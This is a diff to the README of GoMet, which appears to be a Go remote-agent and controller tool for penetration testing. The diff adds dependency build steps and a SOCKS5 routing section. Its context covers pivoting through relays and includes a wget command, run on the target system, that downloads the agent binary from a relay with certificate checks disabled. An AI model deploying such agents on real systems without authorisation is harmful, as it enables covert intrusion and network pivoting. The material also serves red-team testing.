@@ -8,7 +8,18 @@ The agent communicates with its controller through TLS tunnel.
 
 Build
 -----
-Install Go (https://golang.org/dl/) and compile GoMet.
+Install Go (https://golang.org/dl/).
+
+Download dependencies.
+```
+cd gomet
+go get github.com/abiosoft/ishell@v2.0.0+incompatible
+go get github.com/ginuerzh/gosocks5@v0.2.0
+go get github.com/gorilla/mux@v1.7.0
+go get github.com/xtaci/smux@v1.1.2
+cd ..
+```
+And compile GoMet.
 
 ```
 go build .
@@ -129,6 +140,11 @@ Listen a port locally (on the controller system) and forward it to a remote serv
 Listen a port remotely (on the agent system) and forward it to a local service.
 
 
+Socks5 and routing
+-----------------
+We can enable a Socks5 listener on the controller to access remote networks through the agents and define routes toward the different sessions.
+
+
 Make a relay
 ------------
 If the controller is not accessible from the target system (after network pivot) we can define a "relay" on another agent.
@@ -146,7 +162,7 @@ And from the target system
 wget https://<relay>:9999/khRoKbh3AZSHbix/agent/darwin/amd64 --no-check-certificate -O agent
 ````
 
-Sharing files with the controller
+Share files with the controller
 ---------------------------------
 The controller can share files. 
 
